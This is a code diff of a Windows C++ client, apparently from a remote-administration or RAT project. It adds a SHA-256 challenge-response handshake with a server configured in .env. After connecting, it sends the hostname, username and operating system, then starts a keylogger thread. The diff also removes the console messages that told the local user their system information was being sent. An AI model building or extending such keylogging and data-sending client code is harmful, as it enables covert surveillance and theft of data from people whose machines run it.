@@ -8,6 +8,8 @@
 #include "../utils/TaskList.hpp"
 #include "../utils/NetworkInfoFactory.hpp"
 #include "../utils/KeyLogger.hpp"
+#include "../utils/Hash_Sha256.hpp"
+#include "../utils/LPTF_PacketUtils.hpp"
 #include <iostream>
 #include <windows.h>
 #include <thread>
@@ -111,25 +113,42 @@ int main() {
         string ip = EnvLoader::loadIP("../../.env");
         int port = EnvLoader::loadPort("../../.env");
 
+        std::string handshake_secret;
+        auto it = env.find("HANDSHAKE_SECRET");
+        if (it != env.end()) {
+            handshake_secret = it->second;
+        } else {
+            cerr << "HANDSHAKE_SECRET not found in .env!" << endl;
+            return 1;
+        }
+
         clientSocket.connectSocket(ip, port);
-        cout << "Connecté au serveur " << ip << ":" << port << endl;
-        
-        // AUTO-SEND SYSTEM INFO ON CONNECTION
-        cout << "Envoi automatique des informations système..." << endl;
+
+        // 1. Wait for AUTH_CHALLENGE
+        vector<uint8_t> challengeData = clientSocket.recvBinary();
+        LPTF_Packet challengePacket = LPTF_Packet::deserialize(challengeData);
+        if (challengePacket.getType() != PacketType::AUTH_CHALLENGE) {
+            cerr << "Erreur: le serveur n'a pas envoyé de challenge d'authentification !" << endl;
+            return 1;
+        }
+        size_t offset = 0;
+        std::string challenge = extractStringFromPayload(challengePacket.getPayload(), offset);
+
+        // 2. Compute and send AUTH_PROOF
+        std::string proof = sha256_hex(challenge + handshake_secret);
+        std::vector<uint8_t> proofPayload;
+        appendStringToPayload(proofPayload, proof);
+        LPTF_Packet proofPacket(1, PacketType::AUTH_PROOF, 0, 1, 1, proofPayload);
+        clientSocket.sendBinary(proofPacket.serialize());
+
+        // 3. (Optional) Wait for server confirmation of authentication
+
+        // 4. Now send system info and process list
         auto sysInfo = SystemInfo::getSystemInfo();
         string jsonInfo = SystemInfo::toJson(sysInfo);
-        
-        cout << "Informations système:" << endl;
-        cout << "- Nom d'hôte: " << sysInfo["hostname"] << endl;
-        cout << "- Utilisateur: " << sysInfo["username"] << endl;
-        cout << "- Système: " << sysInfo["operating_system"] << endl;
-        
-        // Send system info as GET_INFO packet (since that's what server expects)
         vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
         LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
         clientSocket.sendBinary(sysInfoPacket.serialize());
-        
-        cout << "Informations système envoyées au serveur." << endl;
         
         // KEYLOGGER 
         std::thread([]() {
